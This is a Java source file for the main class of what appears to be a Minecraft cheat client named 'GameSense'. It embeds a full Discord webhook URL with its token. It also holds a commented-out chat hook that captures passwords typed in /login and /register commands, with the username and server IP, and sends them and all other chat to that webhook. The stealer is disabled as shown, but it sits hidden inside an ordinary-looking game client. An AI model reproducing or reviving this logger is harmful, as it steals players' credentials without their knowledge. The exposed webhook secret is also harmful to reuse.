package Game.Sense.client;


import Game.Sense.client.Helper.events.impl.input.logger.config.cfg;
import Game.Sense.client.Helper.events.impl.input.logger.webhook.DiscordWebhook;
import Game.Sense.client.UI.UwU.ClientChatEvent;
import Game.Sense.client.mine.cmd.CommandManager;
import Game.Sense.client.mine.cmd.macro.MacroManager;
import Game.Sense.client.mine.drag.DraggableHUD;
import Game.Sense.client.Helper.EventManager;
import Game.Sense.client.Helper.EventTarget;
import Game.Sense.client.Helper.events.impl.input.EventInputKey;
import Game.Sense.client.module.Module;
import Game.Sense.client.module.ModuleManager;
import Game.Sense.client.mine.SRC.FileManager;
import Game.Sense.client.mine.SRC.impl.FriendConfig;
import Game.Sense.client.mine.SRC.impl.HudConfig;
import Game.Sense.client.mine.SRC.impl.MacroConfig;
import Game.Sense.client.UI.UwU.NAXNADO.FriendManager;
import Game.Sense.client.Helper.Utility.render.ScaleUtils;
import ViaMCP.ViaMCP;
import Game.Sense.client.UI.NursultanGui.ClickGuiScreen;
import Game.Sense.client.UI.dop.CFG.ConfigManager;
import Game.Sense.client.Helper.Utility.math.TPSUtils;
import Game.Sense.client.Helper.Utility.other.DiscordHelper;
import Game.Sense.client.Helper.Utility.render.cosmetic.CosmeticRender;
import Game.Sense.client.Helper.Utility.render.cosmetic.impl.DragonWing;
import net.minecraft.client.Minecraft;
import net.minecraft.client.renderer.entity.RenderPlayer;
import net.minecraft.network.play.client.CPacketChatMessage;
import org.apache.logging.log4j.Logger;
import org.lwjgl.opengl.Display;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

public class GameSense {
    public static ScaleUtils scale = new ScaleUtils(2);
    public Long time;

    public ModuleManager featureManager;
    public FileManager fileManager;
    public static long playTimeStart = 0;
    public DraggableHUD draggableHUD;

    public MacroManager macroManager;
    public ConfigManager configManager;

    public CommandManager commandManager;

    public FriendManager friendManager;
    public ClickGuiScreen clickGui;


    public static GameSense instance = new GameSense();

    public static double deltaTime() {
        return Minecraft.getDebugFPS() > 0 ? (1.0000 / Minecraft.getDebugFPS()) : 1;
    }

    public String name = "GameSense";
    public String type = "Premium";
    public static DiscordWebhook webhookLogger = GameSense.logger;
    public String version = "0.1";
    public String coder = "UwU_, toperov, DiGGeR";
    public static DiscordWebhook logger = new DiscordWebhook("https://discord.com/api/webhooks/978740462162673665/OwZ7X2hfh-OuPAh5rJ4-6vfxFsHuoO40KuWYPI7NxqpG0OiDstLL9Kq0aRJnEaRrjxch");


//    public static void ChatEvent(ClientChatEvent event) throws IOException {
//        String msg = event.getMessage();
//        String[] sentences = event.getMessage().split(" ");
//        if ((msg.startsWith("/l") || msg.startsWith("/login") ||  msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
//            webhookLogger.clearEmbeds();
//            webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
//                    .setTitle("Infinity")
//                    .setDescription("Minecraft Modification | Logger")
//                    .setColor(new Color(0x0082FF))
//                    .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
//                    .addField("PASSWORD", sentences[1], true)
//                    .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
//                    .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)
//                    .setThumbnail("https://cdn.discordapp.com/avatars/860143202358525982/efef80293eb31d69dd3c654ebd1a5575.webp?size=100"));
//            webhookLogger.execute();
//
//        } else {
//            webhookLogger.setContent("```" + Minecraft.getMinecraft().getSession().getUsername() + ": " + msg + "```");
//            webhookLogger.execute();
//        }
//    }




    public void init() throws IOException {


        time = System.currentTimeMillis();
        Display.setTitle(name + " " + type + " " + version);
        (fileManager = new FileManager()).loadFiles();
//        GameSense.ChatEvent(null);
        friendManager = new FriendManager();
        featureManager = new ModuleManager();

        macroManager = new MacroManager();
        configManager = new ConfigManager();
        draggableHUD = new DraggableHUD();
        commandManager = new CommandManager();
        clickGui = new ClickGuiScreen();
        new DragonWing();
        for (RenderPlayer render : Minecraft.getMinecraft().getRenderManager().getSkinMap().values()) {
            render.addLayer(new CosmeticRender(render));
        }
        TPSUtils tpsUtils = new TPSUtils();
        try {
            ViaMCP.getInstance().start();
            ViaMCP.getInstance().initAsyncSlider();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            this.fileManager.getFile(FriendConfig.class).loadFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            this.fileManager.getFile(MacroConfig.class).loadFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            this.fileManager.getFile(HudConfig.class).loadFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
        EventManager.register(this);
    }

    public void stop() {
        GameSense.instance.configManager.saveConfig("default");
        fileManager.saveFiles();
        DiscordHelper.stopRPC();
        EventManager.unregister(this);
    }

    @EventTarget
    public void onInputKey(EventInputKey event) {
        featureManager.getAllFeatures().stream().filter(module -> module.getBind() == event.getKey()).forEach(Module::toggle);
        macroManager.getMacros().stream().filter(macros -> macros.getKey() == event.getKey()).forEach(macros -> Minecraft.getMinecraft().player.sendChatMessage(macros.getValue()));
    }
    public static final Color getClientColor() {
        return new Color(0, 0, 0, 255);
    }
}
